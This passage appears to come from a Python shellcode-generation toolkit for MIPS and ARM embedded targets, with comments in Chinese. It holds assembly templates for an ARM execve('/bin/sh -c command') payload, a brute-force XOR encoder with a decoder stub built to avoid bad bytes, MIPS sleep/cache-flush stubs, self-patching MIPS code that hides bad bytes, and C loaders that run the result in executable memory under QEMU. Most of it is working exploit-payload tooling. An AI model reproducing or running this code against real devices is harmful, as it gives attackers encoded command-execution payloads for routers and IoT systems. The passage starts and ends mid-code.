                # 【关键修复】在返回前就移除末尾的空字节
                self.xor_decoded_shellcode = binary_data.rstrip(b'\x00')
        finally:
            # 清理临时文件
            if save_file == False:
                for f in [s_file, o_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - C源码: {s_file}")
                print(f"  - ELF文件: {o_file}")
                print(f"  - 二进制: {bin_file}")


class Sleep:
    """
    一个独立的类，专门用于生成一段MIPS sleep(0)存根的二进制shellcode。
    这段代码旨在通过强制上下文切换来解决指令缓存(I-Cache)同步问题。
    """

    # --- 类属性：MIPS汇编模板 ---
    MIPS_SLEEP_TEMPLATE = """
#
# MIPS Sleep 存根汇编模板 (自由落体版)
#
.section .text
.global __start
.set noreorder

__start:
    # --- 使用 bal 技巧获取当前代码位置，用于计算下一段 payload 的地址 ---
    bal     get_pc
    nop                         # 延迟槽。执行后，$ra 会指向 get_pc 标签处

get_pc:
    # --- 计算下一段 payload 的地址，为 cacheflush 做准备 ---
    # $ra 指向了本条 addiu 指令。从这里到这个代码块的末尾共有 14 条指令 (14 * 4 = 56 字节)。
    # 所以 $ra + 56 就是下一段 payload (自由落体目标) 的起始地址。
    addiu   $s1, $ra, 56

    # --- Sleep 逻辑 ---
    addiu   $sp, $sp, -8
    li      $t0, 3
    sw      $t0, 0($sp)
    sw      $zero, 4($sp)
    move    $a0, $sp
    li      $v0, 4166           # nanosleep
    syscall
    addiu   $sp, $sp, 8

    # --- [关键] 清空下一段 payload 所在区域的指令缓存 ---
    move    $a0, $s1            # a0 = 要刷新的地址 (下一段payload的开头)
    li      $a1, 1024           # a1 = 刷新的长度 (一个足够大的值即可)
    li      $a2, 1              # a2 = 1 表示刷新 I-cache
    li      $v0, 4147           # cacheflush 系统调用号
    syscall

# --- [注意] 这里没有跳转指令，代码会直接“落体”到下一段 shellcode ---
"""

    def __init__(self, save_file=False, verbose=False):
        """
        初始化Sleep存根生成器。

        Args:
            save_file (bool): 如果为True，则在当前目录保存最终的.bin文件。
            verbose (bool): 如果为True，则打印详细的编译和调试信息。
        """
        self.save_file = save_file
        self.verbose = verbose
        self.bin_file_name = "sleep_stub.bin"
        self.Sleep_shellcode = None
        self.generate()

    def generate(self):
        """
        执行完整的编译流程，并返回二进制的sleep存根。

        Returns:
            bytes: 生成的二进制代码；如果失败则返回None。
        """
        # 使用临时目录来处理编译过程中的中间文件
        s_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_sleep_shellcode.s")
        o_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_sleep_shellcode.o")
        bin_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_sleep_shellcode.bin")

        # 将汇编模板写入.s文件
        with open(s_file, "w") as f:
            f.write(self.MIPS_SLEEP_TEMPLATE)

        if self.verbose:
            print(f"[Sleep Class] Compiling assembly file: {s_file}")

        # 编译汇编代码为对象文件(.o)
        # 使用 -c 选项只编译不链接，这是生成shellcode的关键
        subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-c", "-nostdlib", "-o", o_file, s_file],
                       capture_output=True, text=True)
        if self.verbose:
            print(f"[Sleep Class] Extracting .text section from {o_file}")
        # 从对象文件中提取.text节，生成纯二进制文件
        subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", o_file, bin_file],
                       capture_output=True, text=True)

        # 读取最终的二进制数据
        with open(bin_file, "rb") as fd:
            sleep_shellcode = fd.read()
        self.Sleep_shellcode = sleep_shellcode
        if self.save_file:
            shutil.copy(bin_file, self.bin_file_name)
            print(f"[+] Sleep存根已保存为: {self.bin_file_name} ({len(sleep_shellcode)} bytes)")


class MipsVerifyShellcode:
    """
    一个用于生成、编译并执行C语言Shellcode测试框架的类。
    它接收原始的二进制数据(bytes)并自动格式化。
    """

    def __init__(self, shellcode_bytes):
        """
        初始化生成器。
        参数:
            shellcode_bytes (bytes): 完整的、最终的shellcode二进制数据。
        """
        if not isinstance(shellcode_bytes, bytes):
            raise TypeError("shellcode_bytes 参数必须是 bytes 类型。")
        self.shellcode_bytes = shellcode_bytes
        self.generate_and_run()

    def _format_shellcode_as_c_string(self):
        """
        [修正] 将二进制数据格式化为C语言的字符串字面量数组。
        """
        if not self.shellcode_bytes:
            return '    "";'
        c_string_lines = []
        for i in range(0, len(self.shellcode_bytes), 4):
            chunk = self.shellcode_bytes[i:i + 4]
            hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
            c_string_lines.append(f'"{hex_string}"')
        return '\n'.join(c_string_lines) + '\n;'

    def generate_and_run(self):
        """
        生成、编译并执行完整的C语言测试文件。

        参数:
            qemu_path (str): QEMU静态模拟器的路径。
        """

        # 1. [修正] 准备C代码前，先格式化shellcode
        formatted_shellcode = self._format_shellcode_as_c_string()
        final_c_code_bak = f"""
#include <stdio.h>
#include <string.h>

char shellcode[] =
{formatted_shellcode}


void main(void)
{{
    printf("[+] Shellcode 大小: %zu 字节\\n", sizeof(shellcode) - 1);
    void (*s)(void) = (void (*)())shellcode;
    printf("[+] 准备执行shellcode...\\n");
    s();
    printf("[+] Shellcode 执行完毕。\\n");
}}
"""
        final_c_code = f"""
        #include <stdio.h>
        #include <string.h>
        #include <sys/mman.h>

        unsigned char shellcode[] =
        {formatted_shellcode}
        int main() {{
            void *exec_mem = mmap(NULL, sizeof(shellcode),
                                  PROT_READ | PROT_WRITE | PROT_EXEC,
                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

            if (exec_mem == MAP_FAILED) {{
                perror("mmap");
                return 1;
            }}

            memcpy(exec_mem, shellcode, sizeof(shellcode));
            printf("Executing shellcode at address: %p\\\n", exec_mem);

            void (*func)() = (void(*)())exec_mem;
            func();

            munmap(exec_mem, sizeof(shellcode));
            return 0;
        }}
        """

        qemu_path = config['QEMU_PATH']
        c_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_verify_shellcode.c")
        elf_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_verify_shellcode")
        # 2. 写入文件
        try:
            with open(c_file_path, "w") as f:
                f.write(final_c_code)
            print(f"[+] C语言测试文件 '{c_file_path}' 已成功生成。")
        except IOError as e:
            print(f"[-] 错误: 写入文件 '{c_file_path}' 失败: {e}")
            return
        # 3. 编译
        subprocess.run([
            f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-z", "execstack", "-static", "-g", "-o", elf_file_path,
            c_file_path], capture_output=True, text=True)

        print(f"[+] 编译成功: 可执行文件 '{elf_file_path}'。")
        # 4. 执行
        result = subprocess.run([qemu_path, elf_file_path], capture_output=True, text=True)
        print(result.stdout)
        if result.stderr:
            print(result.stderr)
        if result.returncode == 0:
            print("✅ 验证成功: Shellcode 似乎已成功执行 (QEMU 返回值为 0)。")
        else:
            print(f"[!] 验证警告: Shellcode 执行后 QEMU 返回非零值 ({result.returncode})。可能表示执行中出现问题。")


class ArmShellcodeGenerator:
    """
    一个为 ARM 架构生成 XOR 编码 shellcode 的多功能类。

    它会自动处理坏字节，并生成一个同样不含坏字节的解码器存根（decoder stub），
    最终将解码器和加密后的 payload 拼接在一起。
    【重构说明】: 解码器已根据要求切换回 AArch32 (标准ARM) 模式。
    """
    EXECVE_TEMPLATE_ARM = """
        .section .text
        .global _start
        .arm

        _start:
            @ execve("/bin/sh", ["/bin/sh", "-c", command], NULL)
            adr r0, shell_strings   @ r0 -> "/bin/sh"

            @ 【关键修复】正确地在栈上构建 argv 数组
            @ 1. 计算其他字符串的地址
            add r1, r0, #8          @ r1 -> "-c"
            add r2, r0, #11         @ r2 -> command 字符串
            eor r3, r3, r3          @ r3 = 0 (NULL)

            @ 2. 在栈上为4个指针分配16字节空间
            sub sp, sp, #16

            @ 3. 按正确顺序存储指针
            str r0, [sp, #0]        @ argv[0] = &("/bin/sh")
            str r1, [sp, #4]        @ argv[1] = &("-c")
            str r2, [sp, #8]        @ argv[2] = &("{command}")
            str r3, [sp, #12]       @ argv[3] = NULL

            @ 4. 设置 execve 的参数
            mov r0, r0              @ r0 仍然是 &("/bin/sh")
            mov r1, sp              @ r1 = argv (现在 sp 正确地指向数组开头)
            mov r2, r3              @ r2 = envp (NULL)

            mov r7, #11             @ execve 的系统调用号
            svc #0                  @ 发起系统调用

        failed_exec:
            @ 如果 execve 失败, 则调用 exit(1) 干净地退出
            mov r0, #1              @ 设置退出码为 1
            mov r7, #1              @ exit 的系统调用号
            svc #0                  @ 发起系统调用

        shell_strings:
            .string "/bin/sh"
            .asciz "-c"
            .asciz "{command}"
        """
    # 【最终方案】回归V1，使用LDRB/STRB并修复跳转逻辑
    DECODER_TEMPLATE_ARM = """
    .section .text
    .global _start
    .arm

    _start:
        @ --- 步骤 1: 获取 payload 的地址 (使用 r4) ---
        adr r4, payload_start

        @ --- 步骤 2: 加载密钥(r5)和循环次数(r6) ---
        {key_loader}
        {count_loader}

    decode_loop:
        @ --- 步骤 3: 解码循环 (使用 r7, r8 作为临时寄存器) ---
        @ 加载最高位字节 (无 00)
        ldrb r7, [r4, #3]
        lsl r7, r7, #24

        @ 加载次高位字节 (无 00)
        ldrb r8, [r4, #2]
        orr r7, r7, r8, lsl #16

        @ 加载次低位字节 (无 00)
        ldrb r8, [r4, #1]
        orr r7, r7, r8, lsl #8

        @ 核心优化: 规避 ldrb r8, [r4] (机器码 E5D48000)
        @ 使用 ldrb r8, [r4, #4] 并配合 sub r4, r4, #4 是一种常见且有效的技巧
        add r4, r4, #4                @ 指针 r4 临时前移 4 字节
        ldrb r8, [r4, #-4]            @ 加载最低位字节 (机器码 E4D48004, 无 00)
        sub r4, r4, #4                @ 将指针 r4 恢复到原位
        orr r7, r7, r8                @ 合并最终的字到 r7

        eor r7, r7, r5                @ 与密钥进行 XOR 操作

        @ 存储回内存
        strb r7, [r4], #1             @ 存储最低位字节, r4++
        mov r8, r7, lsr #8
        strb r8, [r4], #1             @ 存储次低位字节, r4++
        mov r8, r7, lsr #16
        strb r8, [r4], #1             @ 存储次高位字节, r4++
        mov r8, r7, lsr #24
        strb r8, [r4], #1             @ 存储最高位字节, r4++

        subs r6, r6, #1               @ 循环计数器减 1
        bne decode_loop               @ 如果计数器不为零，则继续循环

        @ --- 步骤 4: 跳转到已解码的 shellcode (使用 r4, r8) ---
        {loop_count_loader_for_jump}
        lsl r8, r8, #2
        sub r4, r4, r8
        bx r4

    payload_start:
        @ 加密后的 shellcode 将被放置在这里
        """

    def __init__(self, bad_bytes, save_files=False):
        """
        初始化编码器并自动执行整个编码流程。
        """
        # 步骤 1: 初始化所有属性
        self.raw_shellcode = None
        self.xor_encoded_shellcode = None
        self.xor_decoder_shellcode = None

        self.bad_bytes = bad_bytes
        self.save_files = save_files
        self.key = None
        self.loop_count = 0

    def _generate_shellcode_from_asm(self, command):
        """
        [重构] 使用 ARM 汇编模板和交叉编译器来生成执行特定命令的原始 shellcode。
        """
        final_asm = self.EXECVE_TEMPLATE_ARM.format(command=command)
        tmp_s_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_raw_shellcode.s")
        tmp_o_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_raw_shellcode.o")
        tmp_bin_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_raw_shellcode.bin")

        with open(tmp_s_path, "w") as f:
            f.write(final_asm)

        try:
            cmd_as = [f"{config['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", tmp_o_path, tmp_s_path]
            subprocess.run(cmd_as, check=True, capture_output=True)

            cmd_objcopy = [f"{config['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", tmp_o_path,
                           tmp_bin_path]
            subprocess.run(cmd_objcopy, check=True, capture_output=True)

            with open(tmp_bin_path, "rb") as f:
                self.raw_shellcode = f.read()
        finally:
            if not self.save_files:
                for f in [tmp_s_path, tmp_o_path, tmp_bin_path]:
                    if os.path.exists(f):
                        os.remove(f)

    def xorencoder(self):
        """
        [逻辑还原] 暴力搜索一个能生成不含坏字节 payload 的密钥。
        此函数现在只检查编码后的shellcode。
        """
        print(f"[+] 开始进行XOR编码，处理坏字节...   定义的坏字节:{[hex(b) for b in self.bad_bytes]}")

        # 计算填充和循环次数
        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_len = len(self.raw_shellcode) + padding_needed
        self.loop_count = padded_len // 4

        max_attempts = 200000
        for attempt in range(max_attempts):
            if (attempt + 1) % 50000 == 0:
                print(f"    -- 仍在搜索... (已尝试 {attempt + 1}/{max_attempts} 次)")

            key = random.randint(1, 0xFFFFFFFF)

            # --- 只检查编码后的 payload ---
            encoded_payload = self._internal_xorencode(key, self.raw_shellcode)
            if any(b in self.bad_bytes for b in encoded_payload):
                continue

            # --- 成功: payload 不含坏字节 ---
            print(f"✅ 成功！在 {attempt + 1} 次尝试后找到安全密钥: {hex(key)}")

            self.key = key
            self.xor_encoded_shellcode = encoded_payload
            return
        raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到能生成干净 payload 的密钥。")

    def xordecoder(self):
        """
        [逻辑还原] 使用找到的密钥和循环次数生成解码器存根。
        此函数不检查生成的解码器是否包含坏字节，依赖于优化的汇编模板。
        """
        key_loader_asm = self._get_safe_value_loader('r5', self.key)
        count_loader_asm = self._get_safe_value_loader('r6', self.loop_count)
        # 为跳转逻辑加载循环次数到 r8
        loop_count_loader_for_jump_asm = self._get_safe_value_loader('r8', self.loop_count)

        decoder_asm_final = self.DECODER_TEMPLATE_ARM.format(
            key_loader=key_loader_asm,
            count_loader=count_loader_asm,
            loop_count_loader_for_jump=loop_count_loader_for_jump_asm
        )

        self.xor_decoder_shellcode = self._compile(decoder_asm_final)

    def verify_shellcode(self, shellcode):

        # [修正] 验证最终生成的 shellcode，而不是原始的 shellcode
        c_shellcode = ", ".join([f"0x{b:02x}" for b in shellcode])

        # C 语言加载器模板
        c_loader_code = f"""
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {{ {c_shellcode} }};

int main(void) {{
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}
    memcpy(mem, shellcode, sizeof(shellcode));
    fflush(stdout);
    ((void (*)(void))mem)();
    return 0;
}}
"""
        # 定义临时文件路径
        c_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_verify_shellcode.c")
        elf_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_verify_shellcode")

        try:
            # 写入 C 文件
            with open(c_file_path, "w") as f:
                f.write(c_loader_code)
            print(f"[+] C语言测试文件 '{c_file_path}' 已成功生成。")

            # 编译 C 文件
            subprocess.run([
                f"{config['ARM_TOOLCHAIN_PATH']}gcc",
                "-o", elf_file_path,
                c_file_path,
                "-static"  # 静态链接对于 QEMU user-mode 很重要
            ], check=True, capture_output=True)
            print(f"[+] 编译成功! 可执行文件 '{elf_file_path}'")
            # 使用 QEMU 执行
            result = subprocess.run([config['ARM_PATH'], elf_file_path], capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print("--- stderr ---")
                print(result.stderr)

            if result.returncode == 0:
                print("✅ 验证成功: Shellcode 似乎已成功执行 (QEMU 返回值为 0)。")
            else:
                print(f"[!] 验证警告: Shellcode 执行后 QEMU 返回非零值 ({result.returncode})。可能表示执行中出现问题。")

        except subprocess.CalledProcessError as e:
            print(f"\n[!!!] 验证失败: 编译 C 加载器时出错。")
            print(f"--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")

    def _internal_xorencode(self, key, data_to_encode):
        """
        内部辅助函数：使用给定的密钥对数据进行 XOR 编码。
        """
        # 使用一个不含坏字节的 ARM NOP 指令 (mov r1, r1 -> e1a01001) 作为填充
        arm_nop = b'\x01\x10\xa0\xe1'
        padding_needed = (4 - len(data_to_encode) % 4) % 4

        padded_data = data_to_encode + (arm_nop * (padding_needed // 4))

        encoded_buffer = bytearray()
        for i in range(0, len(padded_data), 4):
            chunk = padded_data[i:i + 4]
            dword = int.from_bytes(chunk, 'little')
            xored_dword = (dword ^ key).to_bytes(4, 'little')
            encoded_buffer.extend(xored_dword)
        return bytes(encoded_buffer)

    # def _get_safe_value_loader(self, register, value):
    #     if value < 256:
    #         # 使用 mov 指令，避免 ldr，因为 ldr 可能会从 .pool 加载数据，引入坏字节
    #         return f"mov {register}, #{value}\n"
    #     if value < 0x10000:
    #         return f"movw {register}, #{value}\n"
    #
    #     lower16 = value & 0xFFFF
    #     upper16 = (value >> 16) & 0xFFFF
    #     instr = f"movw {register}, #{lower16}\n"
    #     if upper16 != 0:
    #         instr += f"movt {register}, #{upper16}\n"
    #     return instr
    def _get_safe_value_loader(self, register, value):
        """
        生成一段汇编代码，用于将一个 32 位值安全地加载到指定的寄存器。
        该方法避免了 ldr/movt/movw 指令，并生成与字节序无关的代码。
        """
        instr = ""
        if value == 0:
            return f"eor {register}, {register}, {register}\n"

        # 使用 mov 和 orr 来构造值
        first_byte = value & 0xFF
        instr += f"mov {register}, #{first_byte}\n"

        if (value >> 8) & 0xFF != 0:
            second_byte = (value >> 8) & 0xFF
            instr += f"orr {register}, {register}, #{second_byte << 8}\n"

        if (value >> 16) & 0xFF != 0:
            third_byte = (value >> 16) & 0xFF
            instr += f"orr {register}, {register}, #{third_byte << 16}\n"

        if (value >> 24) & 0xFF != 0:
            fourth_byte = (value >> 24) & 0xFF
            instr += f"orr {register}, {register}, #{fourth_byte << 24}\n"

        return instr

    def _compile(self, asm_code):
        """
        [重构] 只编译汇编代码，不进行坏字节检查。
        """
        tmp_s_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_xor_decoder.s")
        tmp_o_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_xor_decoder.o")
        tmp_bin_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_xor_decoder.bin")
        with open(tmp_s_path, "w") as f:
            f.write(asm_code)
        try:
            # [重构] 移除 -mthumb 参数，使用默认的 ARM 模式
            cmd = [f"{config['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", tmp_o_path, tmp_s_path]
            subprocess.run(cmd, check=True, capture_output=True)

            subprocess.run(
                [f"{config['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", tmp_o_path, tmp_bin_path],
                check=True, capture_output=True)
            # result = subprocess.run([f"{config['ARM_TOOLCHAIN_PATH']}objdump", "-d", tmp_o_path], capture_output=True, text=True, check=True)
            # print(result.stdout.strip())
            with open(tmp_bin_path, "rb") as f:
                binary_code = f.read()
            return binary_code
        except subprocess.CalledProcessError as e:
            print(
                f"\n[!!!] 汇编失败! 来自 'as' 的错误信息:\n--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")
            return b''
        finally:
            if not self.save_files:
                for f in [tmp_s_path, tmp_o_path, tmp_bin_path]:
                    if os.path.exists(f): os.remove(f)


def check_toolschain(path, arch, endian):
    """
    检查目标目录是否存在。如果不存在，则从指定的URL下载tar.gz文件并解压到该目录。
    该函数依赖于系统已安装 'wget' 和 'tar' 命令。
    """

    print(f"🔎 检查工具链...")
    logging.info(f"🔎 检查工具链...")

    def check_dependencies(path):
        """检查所需的交叉编译工具是否存在于系统中。"""
        tools = ["gcc", "as", "ld", "objcopy"]
        all_found = True
        for tool in tools:
            tool_name = f"{config[path]}{tool}"
            if not shutil.which(tool_name):
                all_found = False
                print(
                    f"错误: 交叉编译工具 '{tool_name}' 未找到。\n"
                    f"请确保您的 MIPS 交叉编译工具链已安装并在系统 PATH 中。"
                )
            else:
                logging.info(f"✅ 工具链 '{tool_name}' 已存在，无需执行任何操作。")
        return all_found

    # --- 2. 检查目标工具链是否存在 ---
    if check_dependencies(path):
        print(f"✅ 对应交叉编译工具均已安装。")
        logging.info(f"✅ 对应交叉编译工具均已安装。")
    else:
        if arch.lower() == "mips":
            if endian == "little":
                path = config['DOWNLOAD_MIPSEL_TOOLCHAIN_URL']
            else:
                path = config['DOWNLOAD_MIPS_TOOLCHAIN_URL']
        else:
            if endian == "little":
                path = config['DOWNLOAD_ARM_TOOLCHAIN_URL']
            else:
                path = config['DOWNLOAD_ARMEB_TOOLCHAIN_URL']
        print(f"ℹ️ 目标工具链 '{path}' 不存在，开始执行下载和解压任务...")
        # --- 3. 使用 wget 下载文件 ---
        try:
            filename = os.path.basename(urllib.parse.urlparse(path).path)
            print(f"🔽 正在从 '{path}' 下载文件...")

            # 构建并执行 wget 命令。-O 参数指定输出文件路径。
            with subprocess.Popen(
                    ["wget", path, "-O", f"/{current_user}/tools/{filename}"],
                    stderr=subprocess.PIPE,
                    bufsize=1,  # 缓冲区大小为1，确保实时性
                    universal_newlines=True  # 以文本模式读取输出
            ) as process:
                # 实时读取并处理 stderr 的每一行
                # 每一行都用回车符 \r 覆盖上一行
                for line in process.stderr:
                    line = line.strip()  # 移除行尾的空白符（包括换行符）
                    if line:  # 确保非空行
                        sys.stdout.write(f"\r{line}")
                        sys.stdout.flush()  # 强制刷新输出，确保立即显示
                # 下载完成后，打印一个空行以确保光标在新的一行
                sys.stdout.write("\n")
                # 检查子进程的退出码
                if process.wait() != 0:
                    raise subprocess.CalledProcessError(
                        process.returncode, process.args
                    )
            print(f"👍 下载成功，文件已保存至: /{current_user}/tools/{filename}")
        except FileNotFoundError:
            print("❌ 错误: 'wget' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
            return False
        except subprocess.CalledProcessError as e:
            # 捕获 wget 执行失败的错误
            print(f"❌ 使用 wget 下载失败。返回码: {e.returncode}")
            print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
            return False

        # --- 4. 创建目录并使用 tar 解压文件 ---
        try:
            print(f"📦 正在将 '/{current_user}/tools/{filename}' 解压到 '/{current_user}/tools/'...")
            subprocess.run(["tar", "-xf", f"/{current_user}/tools/{filename}", "-C", f"/{current_user}/tools/"],
                           check=True, capture_output=True)
            print(f"\n🎉 任务完成！文件已成功下载并解压到 /home/{current_user}/tools/{filename}。")
        except FileNotFoundError:
            print("❌ 错误: 'tar' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
            return False
        except subprocess.CalledProcessError as e:
            print(f"❌ 使用 tar 解压失败。返回码: {e.returncode}")
            print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
            return False
        return True


def check_bad_bytes(binary_data: bytes) -> Tuple[bool, List[str]]:
    """
    检查二进制数据中是否包含配置中指定的任何坏字节。
    这个版本兼容 Python 3.6，使用 typing 模块进行类型注解。

    参数:
    binary_data (bytes): 要检查的二进制数据。

    返回:
    tuple[bool, list[str]]:
        - 第一个元素是布尔值：如果找到了任何坏字节则为 True，否则为 False。
        - 第二个元素是列表：如果找到，则包含所有找到的坏字节（十六进制字符串形式）。
    """
    found_bad_bytes = []
    # 遍历配置中的每个坏字节
    for hex_byte in config["BAD_BYTES"]:
        # --- 修复代码核心：在转换前去除 '0x' 前缀 ---
        clean_hex_byte = hex_byte.replace('0x', '').replace('0X', '')

        # 确保去除空格（因为您的原始处理逻辑中可能有空格）
        clean_hex_byte = clean_hex_byte.strip()

        if len(clean_hex_byte) == 1:
            clean_hex_byte = '0' + clean_hex_byte
        elif not clean_hex_byte:
            continue  # 跳过空字符串
        # 将十六进制字符串转换为单字节的二进制数据
        try:
            byte_to_check = bytes.fromhex(clean_hex_byte)
        except ValueError:
            print(f"警告: 无效的十六进制字符串 '{clean_hex_byte}'。跳过。")
            continue

        # 检查坏字节是否存在于二进制数据中
        if byte_to_check in binary_data:
            found_bad_bytes.append(clean_hex_byte)

    # 返回检查结果和找到的坏字节列表
    return (len(found_bad_bytes) > 0, found_bad_bytes)


def print_as_c_string(data, var_name="shellcode"):
    """
    将二进制数据打印成C语言字符串字面量的格式。
    例如: "\xde\xad\xbe\xef"
    """
    print(f"char {var_name}[] =")
    # 每4个字节为一组，生成一行字符串
    for i in range(0, len(data), 4):
        # 获取当前行的数据块
        chunk = data[i:i + 4]
        # 将每个字节格式化为 \xHH 的形式
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        # 打印被双引号包围的字符串
        print(f'    "{hex_string}"')
    print(";")


def print_as_python_bytes(data, var_name="shellcode", line_len=20):
    """
    将二进制数据打印成Python中通过 += 逐行构建字节字符串的格式。
    例如: buf += b"\\xde\\xad\\xbe\\xef"
    """
    # 首先打印初始化行
    print(f'{var_name} = b""')

    # 每次处理 line_len 个字节
    for i in range(0, len(data), line_len):
        # 获取当前行的数据块
        chunk = data[i:i + line_len]
        # 将每个字节格式化为 \xHH 的形式
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        # 打印 "buf += b'...'" 格式的字符串
        print(f'{var_name} += b"{hex_string}"')


def Mips_Runtime_Patching(number1, number2, save_file=False):
    # 最终、简洁、100%无坏字节的正确版本
    asm_mips = """
# MIPS Shellcode (基于SP, 使用减法自我修复, 逻辑清晰版)
.section .text
.set noreorder
.set noat
.globl main

main:
    # 修复代码从这里开始，它位于内存地址 $sp 处

    # --- 步骤 1: 安全地计算出我们目标的"邻居"地址 ---
    # 我们的目标 instruction_to_fix 在 $sp + 32 的位置。
    # 为了使用安全的-4偏移, 我们需要计算出 $sp + 36 这个地址。
    # 方案: 计算 $sp - (-36)，这等同于 $sp + 36
    lui     $t5, 0xffff      # $t5 = 0xffff0000
    ori     $t5, $t5, 0xffdc # $t5 = 0xffffffdc (-36)
    subu    $t4, $sp, $t5    # $t4 = $sp - (-36) ==> $t4 = $sp + 36

    # --- 步骤 2: 准备用于修复的"魔法数字" (Subtractor) ---
    # 我们要计算的减数是 0x1D3D4141
    # Key = Placeholder - Target = 0x41414141 - 0x24040000 = 0x1D3D4141
    lui     $t2, 0x1d3d
    ori     $t2, $t2, 0x4141

    # --- 步骤 3: 执行 "读-修改-写" ---
    # 3a. 读: 从目标地址($sp+32)加载占位符.
    #      因为 $t4 = $sp+36, 所以目标地址就是 -4($t4)
    lw      $t3, -4($t4)     # $t3 = memory[$sp+32] = 0x41414141

    # 3b. 修改: 在寄存器里进行减法运算 (使用 subu)
    subu    $t3, $t3, $t2    # $t3 = 0x41414141 - 0x1D3D4141 = 0x24040000

    # 3c. 写: 把修复好的指令写回内存
    sw      $t3, -4($t4)     # memory[$sp+32] = 0x24040000

#-------------------- 修复代码结束, 共8条指令, 32字节 --------------------

instruction_to_fix:
    # 这个地址是 $sp + 32
    # 初始值是个无害的占位符.
    .word   0x41414141
    # 修复后, 它会变成: .word 0x24040000 (也就是 li $a0, 0)

payload_main:
    # CPU执行到这里时, 上面的指令已经被修复了.
    # 在这里可以继续写你的其他shellcode.
"""
    asm_mips1 = """ 
# MIPS Shellcode (基于SP, 减法修复, 无'00'和'3c')
.section .text
.set noreorder
.set noat
.globl main
main:
    # 结构和之前完全一样: 6条指令(24字节) + 2个数据字(8字节) = 32字节.
    # 基地址 $t4 指向 $sp + 32.
    # --- 步骤 1: 计算基地址 $t4 = $sp + 32. ---
    addiu   $t5, $zero, -32        # $t5 = -32 (0xffffffe0)
    subu    $t4, $sp, $t5          # $t4 = $sp - (-32) = $sp + 32
    # --- 步骤 2: 从内存加载 Subtractor 和 Placeholder (使用负偏移) ---
    # Subtractor 在 $sp+24, 相对 $t4 的偏移是 24-32 = -8
    lw      $t2, -8($t4)           # $t2 = memory[$sp+24] = 0x1D3D4141
    # Placeholder 在 $sp+28, 相对 $t4 的偏移是 28-32 = -4
    lw      $t3, -4($t4)           # $t3 = memory[$sp+28] = 0x41414141
    # --- 步骤 3: 在寄存器中修复指令 (使用减法!) ---
    subu    $t3, $t3, $t2          # $t3 = 0x41414141 - 0x1D3D4141 = 0x24040000
    # addu    $t3, $t3, $t2          # $t3 = 0x41414141 + 0xE2C2BEBF = 0x24040000
    # --- 步骤 4: 将修复好的指令写回内存 ---
    sw      $t3, -4($t4)           # memory[$sp+28] = 0x24040000
#-------------------- 修复代码结束, 依然是6条指令, 24字节 --------------------
subtractor:
    # 地址: $sp + 24
    .word   0x1D3D4141  # 这是新的魔法数字
instruction_to_fix:
    # 地址: $sp + 28
    .word   0x41414141
    # 修复后会变成: .word 0x24040000 (li $a0, 0)
payload_main:
    # 地址: $sp + 32
    # ... 在这里放置你的主 payload ...
    """
    asm_mips2 = """ 
# MIPS Shellcode (基于SP, 减法修复, 无'00'和'3c')
.section .text
.set noreorder
.set noat
.globl main
main:
    # 结构和之前完全一样: 6条指令(24字节) + 2个数据字(8字节) = 32字节.
    # 基地址 $t4 指向 $sp + 32.
    # --- 步骤 1: 计算基地址 $t4 = $sp + 32. ---
    addiu   $t5, $zero, -0x28        # $t5 = -32 (0xffffffe0)
    subu    $t4, $sp, $t5          # $t4 = $sp - (-32) = $sp + 32
    # --- 步骤 2: 从内存加载 Subtractor 和 Placeholder (使用负偏移) ---
    # Subtractor 在 $sp+24, 相对 $t4 的偏移是 24-32 = -8
    lw      $t2, -4($t4)           # $t2 = memory[$sp+24] = 0x1D3D4141
    # Placeholder 在 $sp+28, 相对 $t4 的偏移是 28-32 = -4
    lw      $t3, 0x104($t4)           # $t3 = memory[$sp+28] = 0x41414141
    # --- 步骤 3: 在寄存器中修复指令 (使用减法!) ---
    addu    $t3, $t3, $t2          # $t3 = 0x41414141 + 0xE2C2BEBF = 0x24040000
    # --- 步骤 4: 将修复好的指令写回内存 ---
    addiu   $t4, $t4, -0x2cc         
    sw      $t3, 0x2f8($t4)           # memory[$sp+28] = 0x24040000
"""
    asm_mips3 = """
.section .text
.set noreorder
.set noat
.globl main
main:
    lw  	$t2,{number1}($sp)
    lw  	$t3,{number2}($sp)
